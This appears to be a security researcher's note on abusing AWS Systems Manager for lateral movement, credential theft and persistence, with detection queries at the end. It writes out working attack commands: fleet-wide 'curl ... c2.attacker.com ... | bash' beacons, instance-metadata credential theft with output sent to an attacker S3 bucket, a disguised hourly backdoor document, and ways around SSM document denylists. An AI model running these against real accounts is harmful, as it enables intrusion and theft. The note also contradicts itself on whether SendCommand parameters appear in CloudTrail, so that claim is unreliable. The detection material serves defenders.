---
title: AWS SSM Lateral Movement and Command Execution
date: 2026-03-13
type: ttp
mitre_id: T1651, T1021, T1059.009, T1021.007, T1053, T1572, T1090.001
mitre_tactic: Execution, Lateral Movement, Persistence
threat_actors: []
tools_used: [aws-cli, ssm-session-manager-plugin, Pacu, cloudfox, stratus-red-team, enumerate-iam]
platforms: [AWS]
tags:
  - type/ttp
  - status/active
  - platform/aws
  - category/lateral-movement
  - category/execution
  - category/ssm
source:
  url: https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/
  author: hackingthe.cloud
  date: 2024
---

## Summary
AWS Systems Manager (SSM) provides two powerful execution primitives — **Run Command** and **Session Manager** — that allow shell-level access to EC2 instances using only IAM credentials. No SSH port open, no security group inbound rule, no key pair, no bastion host required. The command content sent via Run Command is **explicitly hidden from CloudTrail** (`HIDDEN_DUE_TO_SECURITY_REASONS`). Session Manager provides interactive shells with no CloudTrail command logging unless specifically configured. This makes SSM one of the most impactful and detection-resistant lateral movement techniques in AWS. SSM associations (State Manager) additionally enable **scheduled persistence** that survives instance replacement.

## How It Works

### Step 1 — Enumerate SSM-Managed Instances
```bash
aws ssm describe-instance-information
```
Returns all EC2 instances with an active SSM agent — name, OS, IP, agent version.

### Step 2a — Execute Commands (Run Command)
```bash
aws ssm send-command \
  --instance-ids "i-0123456789abcdef0" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="id; cat /etc/passwd; env"

# Retrieve output
aws ssm list-command-invocations --command-id "<id>" --details
```

### Step 2b — Interactive Shell (Session Manager)
```bash
aws ssm start-session --target i-0123456789abcdef0
# Opens interactive shell — no SSH required
```

### Step 3 — Pivot to Internal Services (Port Forwarding)
```bash
aws ssm start-session \
  --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSessionToRemoteHost \
  --parameters '{"portNumber":["5432"],"localPortNumber":["5432"],"host":["internal-db.corp.internal"]}'
# Now: psql -h localhost -p 5432 connects to the internal database
```

---

## Technical Reference

### How SSM Connectivity Works
The SSM Agent runs as a daemon on the instance and maintains persistent outbound HTTPS/WSS connections to three endpoints:
- `ssm.<region>.amazonaws.com` — control plane
- `ssmmessages.<region>.amazonaws.com` — Session Manager channel
- `ec2messages.<region>.amazonaws.com` — Run Command channel

Because the connection is **outbound from the instance**, no inbound security group rules are needed. Instances in private subnets with no internet access are reachable via NAT Gateway, Internet Gateway, or VPC Interface Endpoints (PrivateLink).

### Required IAM Permissions

#### Attacker-Side (Caller)

| Permission | Action |
|---|---|
| `ssm:DescribeInstanceInformation` | Enumerate SSM-managed instances |
| `ssm:StartSession` | Open interactive shell |
| `ssm:SendCommand` | Execute Run Command |
| `ssm:GetCommandInvocation` | Retrieve command output |
| `ssm:ListCommandInvocations` | List command history |
| `ssm:DescribeSessions` | List active/historical sessions |
| `ssm:CreateDocument` | Create custom SSM documents (persistence) |
| `ssm:CreateAssociation` | Schedule document execution (persistence) |

**Minimum for lateral movement:**
- Interactive shell: `ssm:StartSession` + `ssm:DescribeInstanceInformation`
- Remote execution: `ssm:SendCommand` + `ssm:DescribeInstanceInformation`

#### Instance-Side (IAM Instance Profile)
The instance must have a role with **`AmazonSSMManagedInstanceCore`**, which grants the agent permissions to call `ssmmessages:*` and `ec2messages:*`.

**Privilege escalation path:** If attacker has `iam:PassRole` + `ec2:AssociateIamInstanceProfile`, they can attach `AmazonSSMManagedInstanceCore` to any instance — making instances that were previously unreachable via SSM suddenly accessible.

### Method 1: Session Manager (Interactive Shell)

```bash
# Enumerate managed instances
aws ssm describe-instance-information \
  --query "InstanceInformationList[*].[InstanceId,ComputerName,PlatformType,IPAddress,PingStatus]" \
  --output table

# Open interactive shell
aws ssm start-session --target i-0123456789abcdef0

# Session with specific region
aws ssm start-session --target i-0123456789abcdef0 --region us-east-1
```

**Prerequisite on attacker machine:** `session-manager-plugin` binary (install separately from AWS CLI)

### Method 2: Run Command (Async Remote Execution)

```bash
# Execute shell commands on one instance
aws ssm send-command \
  --instance-ids "i-0123456789abcdef0" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["id","whoami","env | grep AWS","cat /home/ec2-user/.aws/credentials"]'

# Execute across ALL instances with a tag (bulk lateral movement)
aws ssm send-command \
  --targets "Key=tag:Environment,Values=Production" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl -s http://c2.attacker.com/beacon?h=$(hostname) | bash"]'

# Retrieve output
aws ssm get-command-invocation \
  --command-id "abc12345-1234-1234-1234-abc123456789" \
  --instance-id "i-0123456789abcdef0"

# Send output directly to attacker-controlled S3
aws ssm send-command \
  --instance-ids "i-0123456789abcdef0" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]' \
  --output-s3-bucket-name "attacker-bucket" \
  --output-s3-key-prefix "loot/"
```

### Method 3: Port Forwarding (Internal Network Pivot)

No additional security group rules needed. Reaches any TCP port on the instance or any host it can reach internally.

```bash
# Forward internal RDS/PostgreSQL to localhost
aws ssm start-session \
  --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSessionToRemoteHost \
  --parameters '{"host":["prod-db.internal.corp"],"portNumber":["5432"],"localPortNumber":["5432"]}'
# psql -h localhost -U admin -d proddb

# Forward RDP on Windows instance
aws ssm start-session \
  --target i-0123456789abcdef0 \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["3389"],"localPortNumber":["13389"]}'

# SSH over SSM via ProxyCommand (no SSH port open needed)
# ~/.ssh/config:
# Host i-* mi-*
#   ProxyCommand sh -c "aws ssm start-session --target %h --document-name AWS-StartSSHSession --parameters 'portNumber=%p'"
ssh -i key.pem ec2-user@i-0123456789abcdef0
```

### Method 4: Privilege Escalation via SendCommand on High-Privilege Instances

If the attacker's IAM role has `ssm:SendCommand` but limited privileges, they can target EC2 instances that have **high-privilege instance profiles** and steal their IMDS credentials:

```bash
# 1. Find instances with privileged roles
aws ec2 describe-instances \
  --query "Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]" \
  --output table

# 2. Use ssm:SendCommand to steal instance role credentials
aws ssm send-command \
  --instance-ids "i-HIGHPRIV" \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/HighPrivRole"]'

# 3. Retrieve output containing AccessKeyId, SecretAccessKey, Token
aws ssm get-command-invocation --command-id "..." --instance-id "i-HIGHPRIV"
```

This is a documented Rhino Security Labs privilege escalation path: **EC2.1 — `ssm:SendCommand` on EC2 instance with a privileged role**.

### Method 5: Persistent Backdoor via SSM Document Association

```bash
# 1. Create a malicious SSM document
cat > malicious-doc.json <<'EOF'
{
  "schemaVersion": "2.2",
  "description": "Legitimate-looking maintenance task",
  "mainSteps": [{
    "action": "aws:runShellScript",
    "name": "runCommands",
    "inputs": {
      "runCommand": ["curl -s http://c2.attacker.com/beacon.sh | bash"]
    }
  }]
}
EOF

aws ssm create-document \
  --name "SystemHealthCheck" \
  --document-type "Command" \
  --content file://malicious-doc.json

# 2. Associate with all production instances — runs hourly
aws ssm create-association \
  --name "SystemHealthCheck" \
  --targets "Key=tag:Environment,Values=Production" \
  --schedule-expression "rate(1 hour)"
```

Persistence survives: instance reboots, credential rotation, instance replacement (if tag persists).

**Required permissions:** `ssm:CreateDocument` + `ssm:CreateAssociation`

### Alternative SSM Documents (Denylist Bypass)

When `AWS-RunShellScript` is blocked by SCP or IAM condition:

| Document | Capability | Requirement |
|---|---|---|
| `AWS-RunDocument` | Execute any custom SSM document | Maximum flexibility; hardest to denylist |
| `AWS-RunRemoteScript` | Script from S3 or HTTPS URL | None |
| `AWS-ApplyAnsiblePlaybooks` | Download + run Ansible from S3 | Can self-install Ansible |
| `AWS-RunAnsiblePlaybook` | Execute Ansible playbook | Ansible pre-installed |
| `AWS-RunSaltState` | Salt state execution | Salt Stack installed |
| `AWS-InstallPowerShellModule` | PS module install + exec | Windows only |

### CloudTrail Coverage

#### Session Manager Events
| Event | Service | Content Visible? |
|---|---|---|
| `StartSession` | `ssm` | Instance ID, session ID logged; **command content NOT logged** |
| `TerminateSession` | `ssm` | Session end |
| `CreateControlChannel` | `ssmmessages` | Instance-side; agent opening channel |
| `CreateDataChannel` | `ssmmessages` | Instance-side; agent opening data channel |

#### Run Command Events
| Event | Service | Content Visible? |
|---|---|---|
| `SendCommand` | `ssm` | `documentName` and **parameters** logged — command IS visible |
| `GetCommandInvocation` | `ssm` | Output retrieval |
| `AcknowledgeMessage` | `ec2messages` | Instance-side; high volume, noisy |
| `GetMessages` | `ec2messages` | Instance polling; constantly generated |
| `SendReply` | `ec2messages` | Instance returning output |

#### Enumeration Events
| Event | Description |
|---|---|
| `DescribeInstanceInformation` | Instance recon |
| `ListDocuments` | Available documents enumeration |
| `CreateDocument` | Persistence setup |
| `CreateAssociation` | Persistence scheduling |

> **Critical gap**: Session Manager interactive commands are **not logged to CloudTrail**. `SendCommand` parameters ARE visible. Without S3/CWL session logging configured, Session Manager is a complete blind spot.

### Credential Theft Inside SSM Session

```bash
# From inside an SSM shell — steal instance role credentials via IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Attack Chains

#### Chain 1: IAM Keys → Shell on Private EC2
```
Obtain IAM access keys (exposed env, S3, GitHub, etc.)
    ↓
aws ssm describe-instance-information  (find managed targets)
    ↓
aws ssm start-session --target i-xxxx  (shell in private subnet)
    ↓
Steal IMDS credentials (may be higher privilege than initial keys)
    ↓
aws ssm start-session --target i-yyyy  (pivot to more instances)
```

#### Chain 2: Low-Priv Role → Privilege Escalation via Instance Credentials
```
ssm:SendCommand on high-privilege EC2 instances
    ↓
Steal AdministratorAccess instance role via IMDS
    ↓
Full account takeover without ever touching IAM directly
```

#### Chain 3: Port Forward → Internal Database
```
ssm:StartSession
    ↓
AWS-StartPortForwardingSessionToRemoteHost → internal RDS
    ↓
No security group modification needed
    ↓
Dump database directly from localhost
```

#### Chain 4: Malicious Document Association → Persistent Foothold
```
ssm:CreateDocument + ssm:CreateAssociation
    ↓
Associate malicious doc with all instances by tag
    ↓
Runs hourly; survives instance replacement and credential rotation
    ↓
IR team rotates keys but persistence remains until Association deleted
```

#### Chain 5: CI/CD Pipeline Abuse
```
Compromise CI/CD role (GitHub Actions, CodeBuild, Jenkins)
    ↓
CI/CD roles often have ssm:SendCommand for deployments
    ↓
Inject malicious pipeline step → SendCommand to production instances
    ↓
Exfiltrate secrets, deploy implant fleet-wide
```

#### Chain 6: Cross-Account Run Command
```
Account A role has resource-based policy allowing ssm:SendCommand on Account B instances
    ↓
Assume cross-account role
    ↓
Run commands on Account B fleet without Account B IAM keys
```

### Execution Method Comparison

| Feature | Session Manager | Run Command | Port Forwarding |
|---|---|---|---|
| API | `ssmmessages` (WebSocket) | `ec2messages` | `ssmmessages` |
| CloudTrail event | `StartSession` | `SendCommand` | `StartSession` |
| Command in CloudTrail | **NO** | **YES** (parameters logged) | **NO** |
| Multi-instance | No (one at a time) | Yes (tags, resource groups) | No |
| Local requirement | session-manager-plugin | AWS CLI only | session-manager-plugin |
| Red team value | Interactive shell, IMDS theft | Bulk deployment, mass exfil | Internal network pivot |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Cloud Administration Command | T1651 | SSM SendCommand / StartSession for remote execution via cloud management plane |
| Remote Services | T1021 | SSM as a remote access protocol (no traditional network path required) |
| Command and Scripting Interpreter: Cloud API | T1059.009 | Arbitrary shell commands via SSM documents |

---

## Detection Opportunities

### Key Detection Gap
- `SendCommand` logs the invocation but **command content is redacted** in CloudTrail (`HIDDEN_DUE_TO_SECURITY_REASONS`)
- `StartSession` is logged but **session content is not** unless S3/CloudWatch logging is explicitly configured
- No network-level detection possible (SSM uses HTTPS outbound from instance to SSM endpoint)

### Behavioral Indicators
- `ssm:DescribeInstanceInformation` from an IAM identity with no SSM history — reconnaissance
- `ssm:SendCommand` from unexpected identity, especially outside business hours
- `ssm:StartSession` from unexpected source IP or user agent
- `ssm:SendCommand` targeting multiple instances in a short window — lateral movement sweep
- Alternative SSM documents used (`AWS-RunDocument`, `AWS-RunRemoteScript`) — potential denylist bypass
- Instance-side: child processes spawned under `amazon-ssm-agent` with unexpected parent-child relationships

### Detection Configuration Gaps (High Value to Identify)
- `StartSession` to instances without `ssm:SessionManagerRunShell` document logging configured
- Absence of `s3:PutObject` events for session logs to expected S3 bucket

---

## Query Stubs

### CrowdStrike FQL
```fql
// SSM instance enumeration — recon signal
event_simpleName=CloudTrailEvent
| EventName=DescribeInstanceInformation
| table _time, UserIdentityArn, SourceIPAddress, AWSRegion

// SSM SendCommand from unexpected identity
event_simpleName=CloudTrailEvent
| EventName=SendCommand
| table _time, UserIdentityArn, RequestParameters, SourceIPAddress

// SSM Session Manager — shell opened
event_simpleName=CloudTrailEvent
| EventName=StartSession
| table _time, UserIdentityArn, RequestParameters, SourceIPAddress

// Lateral sweep — SendCommand to multiple instances
event_simpleName=CloudTrailEvent
| EventName=SendCommand
| stats dc(RequestParameters.instanceIds) as instance_count by UserIdentityArn
| where instance_count > 3
| sort -instance_count
```

### Databricks SQL
```sql
-- SSM execution events — all types
SELECT
  event_time,
  user_identity_arn,
  event_name,
  request_parameters,
  source_ip_address,
  aws_region
FROM cloudtrail_events
WHERE event_name IN (
  'SendCommand',
  'StartSession',
  'TerminateSession',
  'DescribeInstanceInformation'
)
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
ORDER BY event_time DESC;

-- Session Manager starts without logging configured (detection gap)
SELECT
  event_time,
  user_identity_arn,
  JSON_EXTRACT_SCALAR(request_parameters, '$.target') AS target_instance,
  source_ip_address
FROM cloudtrail_events
WHERE event_name = 'StartSession'
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
ORDER BY event_time DESC;

-- SendCommand lateral sweep — multiple targets from same identity
SELECT
  DATE_TRUNC('hour', event_time) AS hour,
  user_identity_arn,
  COUNT(*) AS command_count,
  COUNT(DISTINCT JSON_EXTRACT_SCALAR(request_parameters, '$.instanceIds')) AS instances_targeted
FROM cloudtrail_events
WHERE event_name = 'SendCommand'
  AND event_time >= CURRENT_DATE - INTERVAL 30 DAYS
GROUP BY 1, 2
HAVING instances_targeted > 2
ORDER BY command_count DESC;
```

---

## Tools Reference

| Tool | Purpose |
|---|---|
| `aws ssm` | All SSM operations |
| session-manager-plugin | Required for StartSession WebSocket |
| Pacu | SSM enumeration and exploitation modules |
| cloudfox | Attack surface enumeration; identifies SSM-accessible instances |
| stratus-red-team | Atomic SSM attack simulation (`aws.execution.ssm-send-command`, `aws.execution.ssm-start-session`) |
| enumerate-iam | Brute-force IAM permissions including `ssm:*` |

---

## Threat Actor Usage
| Actor Type | Method |
|---|---|
| Post-compromise attacker | `SendCommand` to deploy reverse shells or malware across EC2 fleet |
| Insider threat | `StartSession` to directly access production instances without audit trail |
| Ransomware operator | `SendCommand` to encrypt/wipe data across multiple instances simultaneously |

---

## References
- [hackingthe.cloud: Run Shell Commands on EC2](https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/)
- [hackingthe.cloud: Intercept SSM Communications](https://hackingthe.cloud/aws/post_exploitation/intercept_ssm_communications/)
- [Rhino Security Labs: AWS Privilege Escalation Methods — EC2.1 ssm:SendCommand](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

## Related Notes
- [[Hunt - AWS SSM Lateral Movement]] — active hunt hypothesis with queries
- [[AWS IAM Privilege Escalation]] — escalation enabling SSM access
- [[AWS STS AssumeRole and Cross-Account Attacks]] — cross-account SSM execution
- [[30 - Knowledge/Cybersecurity/Research Index]]
